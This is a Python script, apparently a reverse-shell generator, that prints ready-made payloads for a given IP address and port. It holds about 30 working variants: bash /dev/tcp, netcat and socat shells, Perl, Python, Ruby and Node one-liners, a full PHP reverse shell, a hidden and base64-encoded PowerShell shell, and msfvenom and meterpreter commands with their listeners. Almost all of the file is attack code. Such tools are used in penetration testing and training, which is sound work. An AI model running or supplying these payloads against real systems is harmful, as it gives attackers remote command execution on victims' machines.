#!/usr/bin/env python3

from base64 import b64encode
from fcntl import ioctl
from struct import pack

import argparse
import re
import socket
import sys


def parse_options():
    parser = argparse.ArgumentParser(
        description="python revshellgen.py -i 127.0.0.1 -p 1234 -t bash")
    parser.add_argument("-i",
                        "--ipaddr",
                        type=str,
                        default="127.0.0.1",
                        help="IP address or interface to connect back to")
    parser.add_argument("-p", "--port", type=int, default=4444, help="Port to connect back to")
    parser.add_argument("-t",
                        "--type",
                        type=str,
                        help="Type of reverse shell to generate",
                        dest='shell_type')
    parser.add_argument("-l",
                        "--list",
                        action="store_true",
                        help="List available shell types",
                        dest='shell_list')
    args = parser.parse_args()

    if (args.shell_type == None) ^ args.shell_list:
        parser.print_help(sys.stderr)
        sys.exit(1)

    return args


def get_ip(ip_iface: str) -> str:
    # Check if valid ip address
    if re.match(r"(^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$)", ip_iface):
        return ip_iface

    # Get ip address from interface
    if sys.platform != "linux":
        print("Inteface only supported on Linux", file=sys.stderr)
        sys.exit(1)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip_iface = socket.inet_ntoa(
            ioctl(
                s.fileno(),
                0x8915,  # SIOCGIFADDR
                pack('256s', ip_iface[:15].encode()))[20:24])
        return ip_iface
    except Exception as e:
        print(e, file=sys.stderr)
        sys.exit(1)


def get_shell(ipaddr: str, port: int) -> dict:
    asp = {
        "description":
        "ASP stageless reverse shell",
        "reverse":
        "msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%d -f asp -o revshell.asp" %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    bash = {
        "description": "Bash reverse shell",
        "reverse": 'bash -c "bash -i >& /dev/tcp/%s/%d 0>&1"' % (ipaddr, port),
        "listen": "rlwrap -cAr nc -lvnp %d" % (port),
    }

    java = {
        "description":
        "Java reverse shell",
        "reverse":
        'r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();'
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    jsp = {
        "description":
        "JSP stageless reverse shell",
        "reverse":
        'msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%d -f jsp -o reverse.jsp' %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -luvnp %d" % (port)
    }

    linux = {
        "description":
        "Linux stageless reverse shell",
        "reverse":
        'msfvenom -p linux/x64/shell_reverse_tcp LHOST=%s LPORT=%d -f elf -o reverse.elf' %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port)
    }

    linux32 = {
        "description":
        "32-bit Linux stageless reverse shell",
        "reverse":
        'msfvenom -p linux/x86/shell_reverse_tcp LHOST=%s LPORT=%d -f elf -o reverse.elf' %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port)
    }

    linux_meterpreter = {
        "description":
        "Linux stageless meterpreter reverse shell",
        "reverse":
        'msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=%s LPORT=%d -f elf -o reverse.elf' %
        (ipaddr, port),
        "listen":
        'msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set lhost %s; set lport %d; exploit"'
        % (ipaddr, port)
    }

    linux32_meterpreter = {
        "description":
        "32-bit Linux stageless meterpreter reverse shell",
        "reverse":
        'msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=%s LPORT=%d -f elf -o reverse.elf' %
        (ipaddr, port),
        "listen":
        'msfconsole -q -x "use multi/handler; set payload linux/x86/meterpreter_reverse_tcp; set lhost %s; set lport %d; exploit"'
        % (ipaddr, port)
    }

    netcat = {
        "description": "Netcat reverse shell",
        "reverse": 'nc %s %d -e /bin/bash' % (ipaddr, port),
        "listen": "rlwrap -cAr nc -lvnp %d" % (port),
    }

    netcat_mkfifo = {
        "description": "Netcat mkfifo reverse shell",
        "reverse":
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc %s %d >/tmp/f' % (ipaddr, port),
        "listen": "rlwrap -cAr nc -lvnp %d" % (port),
    }

    ncat = {
        "description": "Ncat reverse shell",
        "reverse": 'ncat %s %d -e /bin/bash' % (ipaddr, port),
        "listen": "rlwrap -cAr nc -lvnp %d" % (port),
    }

    ncat_udp = {
        "description":
        "Ncat UDP reverse shell",
        "reverse":
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|ncat -u %s %d >/tmp/f' % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -luvnp %d" % (port),
    }

    node = {
        "description":
        "NodeJS reverse shell",
        "reverse":
        "node -e \'!function(){var n=require(\"net\"),e=require(\"child_process\").spawn(\"bash\",[]),t=new n.Socket;t.connect(%d,\"%s\",function(){t.pipe(e.stdin),e.stdout.pipe(t),e.stderr.pipe(t)})}();\'"
        % (port, ipaddr),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    perl = {
        "description":
        "Perl reverse shell",
        "reverse":
        'perl -e \'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    perl_windows = {
        "description":
        "Windows Perl reverse shell",
        "reverse":
        'perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,"%s:%d");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    php = {
        "description":
        "PHP reverse shell",
        "reverse":
        "<?php set_time_limit(0);$VERSION=\"1.0\";$ip='%s';$port=%d;$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; bash -i';$daemon=0;$debug=0;if(function_exists('pcntl_fork')){$pid=pcntl_fork();if($pid==-1){printit(\"ERROR: Can't fork\");exit(1);}if($pid){exit(0);}if(posix_setsid()==-1){printit(\"Error: Can't setsid()\");exit(1);}$daemon=1;}else{printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");}chdir(\"/\");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){printit(\"$errstr ($errno)\");exit(1);}$descriptorspec=array(0=>array(\"pipe\",\"r\"),1=>array(\"pipe\",\"w\"),2=>array(\"pipe\",\"w\"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){printit(\"ERROR: Can't spawn shell\");exit(1);}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);printit(\"Successfully opened reverse shell to $ip:$port\");while(1){if(feof($sock)){printit(\"ERROR: Shell connection terminated\");break;}if(feof($pipes[1])){printit(\"ERROR: Shell process terminated\");break;}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){if($debug)printit(\"SOCK READ\");$input=fread($sock,$chunk_size);if($debug)printit(\"SOCK: $input\");fwrite($pipes[0],$input);}if(in_array($pipes[1],$read_a)){if($debug)printit(\"STDOUT READ\");$input=fread($pipes[1],$chunk_size);if($debug)printit(\"STDOUT: $input\");fwrite($sock,$input);}if(in_array($pipes[2],$read_a)){if($debug)printit(\"STDERR READ\");$input=fread($pipes[2],$chunk_size);if($debug)printit(\"STDERR: $input\");fwrite($sock,$input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit($string){if(!$daemon){print\"$string\\n\";}} ?>"
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    powershell = {
        "description":
        "Powershell reverse shell",
        "reverse":
        "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('%s', %d);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | %% {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\""
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    powershell_b64 = {
        "description":
        "Encoded Powershell reverse shell",
        "reverse":
        'powershell -e ' + b64encode((
            '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
            % (ipaddr, port)).encode('utf16')[2:]).decode(),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    python = {
        "description":
        "Python reverse shell",
        "reverse":
        "python -c 'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%d));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")'"
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    python_windows = {
        "description":
        "Windows Python reverse shell",
        "reverse":
        "_A=True\r\nimport os,socket,subprocess,threading\r\ndef s2p(s,p):\r\n\twhile _A:\r\n\t\tdata=s.recv(1024)\r\n\t\tif len(data)>0:p.stdin.write(data);p.stdin.flush()\r\ndef p2s(s,p):\r\n\twhile _A:s.send(p.stdout.read(1))\r\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\r\ns.connect((\'%s\',%d))\r\np=subprocess.Popen([\'bash\'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,stdin=subprocess.PIPE)\r\ns2p_thread=threading.Thread(target=s2p,args=[s,p])\r\ns2p_thread.daemon=_A\r\ns2p_thread.start()\r\np2s_thread=threading.Thread(target=p2s,args=[s,p])\r\np2s_thread.daemon=_A\r\np2s_thread.start()\r\ntry:p.wait()\r\nexcept KeyboardInterrupt:s.close()"
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    ruby = {
        "description":
        "Ruby reverse shell",
        "reverse":
        "ruby -rsocket -e\'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%d))\'" %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    ruby_windows = {
        "description":
        "Ruby reverse shell",
        "reverse":
        "ruby -rsocket -e\'exit if fork;c=TCPSocket.new(\"%s\",\"%d\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}\'"
        % (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    socat = {
        "description": "Socat reverse shell",
        "reverse": "socat TCP:%s:%d EXEC:'bash',pty,stderr,setsid,sigint,sane" % (ipaddr, port),
        "listen": "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:%d" % (port),
    }

    telnet = {
        "description":
        "Telnet reverse shell",
        "reverse":
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|telnet %s %d > /tmp/f" %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    war = {
        "description":
        "War stageless reverse shell",
        "reverse":
        "msfvenom -p java/shell_reverse_tcp LHOST=%s LPORT=%d -f war -o revshell.war" %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    windows = {
        "description":
        "Windows stageless reverse shell",
        "reverse":
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=%s LPORT=%d -f exe -o reverse.exe" %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    windows32 = {
        "description":
        "32-bit Windows stageless reverse shell",
        "reverse":
        "msfvenom -p windows/x86/shell_reverse_tcp LHOST=%s LPORT=%d -f exe -o reverse.exe" %
        (ipaddr, port),
        "listen":
        "rlwrap -cAr nc -lvnp %d" % (port),
    }

    windows_meterpreter = {
        "description":
        "Windows stageless meterpreter reverse shell",
        "reverse":
        "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=%s LPORT=%d -f exe -o reverse.exe" %
        (ipaddr, port),
        "listen":
        'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set lhost %s; set lport %d; exploit"'
        % (ipaddr, port),
    }

    windows32_meterpreter = {
        "description":
        "32-bit Windows stageless meterpreter reverse shell",
        "reverse":
        "msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=%s LPORT=%d -f exe -o reverse.exe" %
        (ipaddr, port),
        "listen":
        'msfconsole -q -x "use multi/handler; set payload windows/x86/meterpreter_reverse_tcp; set lhost %s; set lport %d; exploit"'
        % (ipaddr, port),
    }

    shells = {
        "asp": asp,
        "bash": bash,
        "java": java,
        "jsp": jsp,
        "lin": linux,
        "lin32": linux32,
        "lin-met": linux_meterpreter,
        "lin32-met": linux32_meterpreter,
        "nc": netcat,
        "nc-mkfifo": netcat_mkfifo,
        "ncat": ncat,
        "ncat-udp": ncat_udp,
        "node": node,
        "perl": perl,
        "perl-win": perl_windows,
        "php": php,
        "ps": powershell,
        "ps-b64": powershell_b64,
        "py": python,
        "py-win": python_windows,
        "ruby": ruby,
        "ruby-win": ruby_windows,
        "socat": socat,
        "telnet": telnet,
        "war": war,
        "win": windows,
        "win32": windows32,
        "win-met": windows_meterpreter,
        "win32-met": windows32_meterpreter,
    }

    return shells


def main(args: argparse.Namespace) -> None:
    if args.shell_list:
        print("[+] List of shells")
        shells = get_shell("", -1)
        for shell in shells:
            print(f"{shell:<12}{shells[shell]['description']}")

        return

    ipaddr = get_ip(args.ipaddr)
    port = args.port

    print(get_shell(ipaddr, port)[args.shell_type]['reverse'])


if __name__ == "__main__":
    args = parse_options()
    main(args)
